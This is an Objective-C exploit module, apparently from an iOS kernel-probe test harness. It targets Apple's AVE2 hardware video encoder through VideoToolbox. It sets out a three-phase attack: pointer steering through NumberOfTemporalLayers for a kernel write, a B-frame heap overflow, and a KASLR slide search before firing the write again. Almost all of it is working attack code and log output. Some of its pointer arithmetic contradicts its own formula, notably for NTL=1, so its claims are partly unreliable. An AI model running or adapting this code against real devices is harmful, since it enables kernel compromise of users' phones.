#import "KPH9EncoderModule.h"
#import <VideoToolbox/VideoToolbox.h>
#import <AVFoundation/AVFoundation.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <mach/mach.h>

static NSMutableArray *g_h9_logs = nil;
static NSObject *g_h9_lock = nil;

static void H9Log(NSString *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:args];
    va_end(args);
    @synchronized(g_h9_lock) {
        [g_h9_logs addObject:s];
    }
    NSLog(@"[H9] %@", s);
}

// NTL encode callback — just count frames
static volatile int g_h9_frames_encoded = 0;
static volatile OSStatus g_h9_last_encode_status = 0;

static void H9EncodeCallback(void *refCon, void *src, OSStatus status,
                             VTEncodeInfoFlags flags, CMSampleBufferRef sbuf) {
    (void)refCon; (void)src;
    g_h9_last_encode_status = status;
    if (status == noErr && sbuf) {
        g_h9_frames_encoded++;
        CMBlockBufferRef bb = CMSampleBufferGetDataBuffer(sbuf);
        size_t sz = bb ? CMBlockBufferGetDataLength(bb) : 0;
        H9Log(@"  [cb] frame #%d encoded, %zu bytes, status=%d", g_h9_frames_encoded, sz, (int)status);
    } else {
        H9Log(@"  [cb] encode status=%d flags=0x%x", (int)status, (unsigned)flags);
    }
}

@implementation KPH9EncoderModule

@synthesize identifier = _identifier;
@synthesize subtitle = _subtitle;
@synthesize icon = _icon;
@synthesize section = _section;

- (instancetype)init {
    self = [super init];
    if (self) {
        _identifier = @"h9encoder.oob";
        _subtitle = @"AVE2 NTL + B-frame DPB overflow (CVE-2026-112705)";
        _icon = @"video";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (instancetype)initWithNameSweep {
    return [self init];
}

- (NSString *)title { return @"H9 encoder OOB write"; }
- (NSString *)desc { return @"AVE2 NTL kernel write + B-frame DPB MBStats overflow"; }
- (NSString *)risk { return @"CRITICAL"; }
- (NSString *)category { return @"KRW"; }

- (void)run {
    if (!g_h9_lock) g_h9_lock = [[NSObject alloc] init];
    @synchronized(g_h9_lock) {
        if (!g_h9_logs) g_h9_logs = [NSMutableArray array];
        [g_h9_logs removeAllObjects];
    }

    H9Log(@"=== H9 encoder OOB write ===");
    H9Log(@"CVE-2026-112705: AVE2 NumberOfTemporalLayers kernel write");
    H9Log(@"CVE-adjacent: saMBStats[m] DPB overflow (fixed 913.48.1)");
    H9Log(@"");

    // Phase 1: NTL controlled kernel write (proven in V3)
    [self phase1_ntl_sweep];

    // Phase 2: B-frame DPB overflow (from ipsw-diffs)
    [self phase2_bframe_dpb];

    // Phase 3: NTL + KASLR targeting
    [self phase3_ntl_kaslr];

    H9Log(@"");
    H9Log(@"=== H9 COMPLETE ===");
}

#pragma mark - Phase 1: NTL sweep (controlled kernel write)

- (void)phase1_ntl_sweep {
    H9Log(@"--- Phase 1: NTL sweep (pointer steering) ---");
    H9Log(@"Pointer law: x0 = ((NTL-16463) << 32) | 0x59");
    H9Log(@"NTL<16463 -> kernel range write (silent corruption)");
    H9Log(@"");

    // Test NTL values that steer the pointer into kernel range
    // NTL=1 -> x0 = ((1-16463)<<32)|0x59 = 0xFFFFFFF000000059 (canonical kernel)
    // NTL=16462 -> x0 = ((16462-16463)<<32)|0x59 = 0xFFFFFFFF00000059
    // NTL=16447 -> x0 = 0xFFFFFFF000000059
    int ntl_values[] = { 1, 100, 1000, 8000, 16000, 16447, 16462 };
    int ntl_count = sizeof(ntl_values) / sizeof(ntl_values[0]);

    for (int i = 0; i < ntl_count; i++) {
        int ntl = ntl_values[i];
        int64_t idx = (int64_t)ntl - 16463;
        uint64_t x0 = ((uint64_t)idx << 32) | 0x59;
        H9Log(@"  NTL=%d -> x0=0x%016llx (%s)", ntl, x0,
              (x0 >= 0xfffffff000000000ULL) ? "kernel range" : "user/unmapped");
        [self ntl_encode:ntl width:640 height:480];
    }
}

- (void)ntl_encode:(int)ntl width:(int)w height:(int)h {
    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, w, h, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, H9EncodeCallback, NULL, &session);

    if (st != noErr || !session) {
        H9Log(@"    session create: %d", (int)st);
        return;
    }

    // Set NumberOfTemporalLayers — this is the trigger
    CFNumberRef ntlNum = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
    st = VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"), ntlNum);
    CFRelease(ntlNum);
    if (st != noErr) {
        H9Log(@"    set NTL=%d: %d", ntl, (int)st);
        CFRelease(session);
        return;
    }

    // Verify readback
    int readback = 0;
    CFNumberRef rb = NULL;
    VTSessionCopyProperty(session, CFSTR("NumberOfTemporalLayers"), NULL, &rb);
    if (rb) {
        CFNumberGetValue(rb, kCFNumberIntType, &readback);
        CFRelease(rb);
    }

    // Disable frame reordering for simpler encode
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) {
        H9Log(@"    prepare: %d", (int)st);
        CFRelease(session);
        return;
    }

    // Create pixel buffer
    CVPixelBufferRef pb = NULL;
    NSDictionary *attrs = @{ (id)kCVPixelBufferIOSurfacePropertiesKey: @{} };
    CVReturn cv = CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                                      kCVPixelFormatType_32BGRA,
                                      (__bridge CFDictionaryRef)attrs, &pb);
    if (cv != kCVReturnSuccess || !pb) {
        H9Log(@"    NTL=%d PIXELBUFFER_FAILED cv=%d", ntl, (int)cv);
        CFRelease(session);
        return;
    }

    // Fill with pattern
    CVPixelBufferLockBaseAddress(pb, 0);
    uint8_t *base = (uint8_t *)CVPixelBufferGetBaseAddress(pb);
    size_t bpr = CVPixelBufferGetBytesPerRow(pb);
    for (int y = 0; y < h; y++) {
        uint32_t *row = (uint32_t *)(base + y * bpr);
        for (int x = 0; x < w; x++) row[x] = 0xFF000000u | ((x+y)&0xFF)<<16 | ((x*3)&0xFF)<<8 | (y&0xFF);
    }
    CVPixelBufferUnlockBaseAddress(pb, 0);

    // FIRST encode — this is where the trigger fires
    g_h9_frames_encoded = 0;
    VTEncodeInfoFlags flags = 0;
    st = VTCompressionSessionEncodeFrame(session, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, &flags);

    H9Log(@"    NTL=%d readback=%d encode=%d frames=%d %s",
          ntl, readback, (int)st, g_h9_frames_encoded,
          (st == noErr) ? "SURVIVED" : "FAILED");

    CVPixelBufferRelease(pb);
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    CFRelease(session);
}

#pragma mark - Phase 2: B-frame DPB overflow

- (void)phase2_bframe_dpb {
    H9Log(@"");
    H9Log(@"--- Phase 2: B-frame DPB overflow ---");
    H9Log(@"Bug: sMBStats single struct, writes m=0..DPB-1 entries");
    H9Log(@"B-frames -> DPB >= 3 -> sMBStats[1],[2] overflow kernel heap");
    H9Log(@"");

    struct { int w, h; const char *tag; } configs[] = {
        { 640, 480, "VGA" },
        { 1280, 720, "720p" },
    };

    for (int c = 0; c < 2; c++) {
        H9Log(@"  [%s %dx%d, B-frames, GOP=30, 8 frames]", configs[c].tag, configs[c].w, configs[c].h);
        [self bframe_encode:configs[c].w height:configs[c].h frameCount:8 maxKeyFrame:30];
    }
}

- (void)bframe_encode:(int)w height:(int)h frameCount:(int)fc maxKeyFrame:(int)gop {
    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, w, h, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, H9EncodeCallback, NULL, &session);

    if (st != noErr || !session) {
        H9Log(@"    session create: %d", (int)st);
        return;
    }

    // KEY: Enable B-frames -> multiple ref frames -> DPB >= 3
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);

    CFNumberRef n;
    n = CFNumberCreate(NULL, kCFNumberIntType, &gop);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, n);
    CFRelease(n);

    int fps = 30;
    n = CFNumberCreate(NULL, kCFNumberIntType, &fps);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_ExpectedFrameRate, n);
    CFRelease(n);

    VTSessionSetProperty(session, kVTCompressionPropertyKey_ProfileLevel, kVTProfileLevel_HEVC_Main_AutoLevel);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) {
        H9Log(@"    prepare: %d", (int)st);
        CFRelease(session);
        return;
    }

    int encoded = 0;
    for (int i = 0; i < fc; i++) {
        CVPixelBufferRef pb = NULL;
        NSDictionary *attrs = @{ (id)kCVPixelBufferIOSurfacePropertiesKey: @{} };
        CVReturn cv = CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                                          kCVPixelFormatType_32BGRA,
                                          (__bridge CFDictionaryRef)attrs, &pb);
        if (cv != kCVReturnSuccess || !pb) continue;

        CVPixelBufferLockBaseAddress(pb, 0);
        uint8_t *base = (uint8_t *)CVPixelBufferGetBaseAddress(pb);
        size_t bpr = CVPixelBufferGetBytesPerRow(pb);
        for (int y = 0; y < h; y++) {
            uint32_t *row = (uint32_t *)(base + y * bpr);
            for (int x = 0; x < w; x++) row[x] = 0xFF000000u | (((x+i*37)&0xFF)<<16) | (((y+i*53)&0xFF)<<8) | ((x^y^(i*17))&0xFF);
        }
        CVPixelBufferUnlockBaseAddress(pb, 0);

        VTEncodeInfoFlags flags = 0;
        st = VTCompressionSessionEncodeFrame(session, pb, CMTimeMake(i, fps), kCMTimeInvalid, NULL, NULL, &flags);
        if (st == noErr) encoded++;
        CVPixelBufferRelease(pb);
    }

    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    H9Log(@"    Done: %d/%d frames, last_encode=%d", encoded, fc, (int)g_h9_last_encode_status);
    CFRelease(session);
}

#pragma mark - Phase 3: NTL + KASLR targeting

- (void)phase3_ntl_kaslr {
    H9Log(@"");
    H9Log(@"--- Phase 3: NTL + KASLR targeting ---");

    // Scan for kernel pointers to compute slide
    H9Log(@"  Scanning user-space RW regions for kernel pointers...");

    NSMutableArray *kptrs = [NSMutableArray array];
    vm_address_t addr = 0;
    vm_size_t size = 0;
    vm_region_basic_info_data_64_t info;
    mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t object_name = 0;

    while (vm_region(mach_task_self(), &addr, &size, VM_REGION_BASIC_INFO_64,
                     (vm_region_info_t)&info, &count, &object_name) == KERN_SUCCESS) {
        if ((info.protection & VM_PROT_READ) && (info.protection & VM_PROT_WRITE)) {
            uint64_t *p = (uint64_t *)addr;
            size_t words = size / 8;
            for (size_t i = 0; i < words && i < 4096; i++) {
                uint64_t v = *(p + i);
                if (v >= 0xfffffff000000000ULL && v < 0xfffffffffffff000ULL) {
                    [kptrs addObject:@(v)];
                }
            }
        }
        addr += size;
        count = VM_REGION_BASIC_INFO_COUNT_64;
    }

    H9Log(@"  Kernel pointers found: %lu", (unsigned long)kptrs.count);

    if (kptrs.count > 0) {
        // Compute slide from __TEXT segment base
        uint64_t textBase = 0xfffffff007004000ULL;
        NSMutableDictionary *slides = [NSMutableDictionary dictionary];
        for (NSNumber *kp in kptrs) {
            uint64_t v = kp.unsignedLongLongValue;
            // Align to 0x4000 (segment alignment)
            uint64_t aligned = v & ~0x3FFFULL;
            if (aligned >= textBase) {
                uint64_t slide = aligned - textBase;
                NSString *key = [NSString stringWithFormat:@"0x%llx", slide];
                slides[key] = @([slides[key] intValue] + 1);
            }
        }

        // Find most frequent slide
        NSString *bestSlide = nil;
        int bestHits = 0;
        for (NSString *s in slides) {
            int hits = [slides[s] intValue];
            if (hits > bestHits) { bestHits = hits; bestSlide = s; }
        }

        if (bestSlide) {
            uint64_t slideVal = strtoull(bestSlide.UTF8String, NULL, 16);
            H9Log(@"  KASLR slide = %@ (hits=%d)", bestSlide, bestHits);
            H9Log(@"  Kernel base = 0x%llx", textBase + slideVal);

            // Now fire NTL with pointer steering into kernel range
            H9Log(@"");
            H9Log(@"  Firing NTL=1 (steers x0 into kernel range)...");
            [self ntl_encode:1 width:640 height:480];

            H9Log(@"  Firing NTL=16447 (steers x0 to 0xfffffff000000059)...");
            [self ntl_encode:16447 width:640 height:480];
        }
    }

    // Summary
    H9Log(@"");
    H9Log(@"--- Summary ---");
    H9Log(@"NTL trigger: controlled kernel write via pointer steering");
    H9Log(@"  x0 = ((NTL-16463) << 32) | 0x59");
    H9Log(@"  NTL=1 -> 0xfffffff000000059 (kernel range, silent write)");
    H9Log(@"  Stores at +0, +8, +0x10 (x0) and 0 at +0x18");
    H9Log(@"B-frame DPB: kernel heap overflow via saMBStats[m]");
    H9Log(@"  B-frames -> DPB >= 3 -> writes past single sMBStats struct");
}

- (NSString *)runReport {
    @synchronized(g_h9_lock) {
        NSMutableString *r = [NSMutableString string];
        for (NSString *s in g_h9_logs) {
            [r appendString:s];
            [r appendString:@"\n"];
        }
        return r;
    }
}

@end
